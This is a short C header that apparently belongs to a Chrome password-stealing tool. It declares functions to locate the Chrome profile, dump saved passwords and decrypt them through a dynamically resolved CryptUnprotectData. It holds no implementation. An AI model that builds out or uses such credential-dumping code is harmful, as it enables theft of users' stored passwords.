#ifndef _CHROME_PASSWORD
#define _CHROME_PASSWORD

typedef BOOL (WINAPI *CryptUnprotectData_t)(DATA_BLOB *pDataIn, LPWSTR *ppszDataDescr, DATA_BLOB *pOptionalEntropy, LPVOID pvReserved, CRYPTPROTECT_PROMPTSTRUCT *pPromptStruct, DWORD dwFlags, DATA_BLOB *pDataOut);

VOID DumpChromePasswords(LPBYTE *lpBuffer, LPDWORD dwBuffSize);
LPWSTR GetChromeProfilePath();
LPSTR GetChromeProfilePathA();
LPWSTR DecryptChromePass(LPBYTE strCryptData);
BOOL ChromePasswordResolveApi();

#endif